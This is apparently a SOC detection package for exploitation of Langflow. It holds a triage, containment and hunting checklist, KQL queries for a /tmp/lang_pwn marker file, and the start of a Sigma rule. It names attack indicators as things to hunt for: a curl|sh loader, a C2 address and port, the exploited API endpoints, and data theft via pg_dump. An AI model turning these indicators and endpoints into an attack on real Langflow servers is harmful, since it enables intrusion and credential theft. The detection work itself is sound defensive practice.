1) TRIAGE: treat any real hit as confirmed compromise; identify the writing process and its Langflow-service parentage. 2) CONTAIN: isolate the host, preserve /tmp for forensics, block 45.207.216.55, and begin credential rotation (LLM/cloud keys, PostgreSQL). 3) HUNT: correlate with the curl|sh loader process, C2 beacons to 45.207.216.55:8084, inbound /api/v1/responses and /api/v1/build_public_tmp requests, and JadePuffer ransomware/pg_dump activity.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated", "FileModified")
| where FolderPath =~ "/tmp/lang_pwn" or FileName =~ "lang_pwn"
| project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath =~ "/tmp/lang_pwn" or TargetFileName =~ "lang_pwn"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc
title: Langflow Exploitation Marker File /tmp/lang_pwn Created
id: e2d4b7c1-3a6f-4c90-9b12-8f0a5d3e77c2
description: Detects creation of the /tmp/lang_pwn marker file dropped by the CVE-2026-55255 / CVE-2026-33017 Langflow loader after successful exploitation.
references:
  - https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
author: SOC Detection Engineering
date: 2026/07/08
tags:
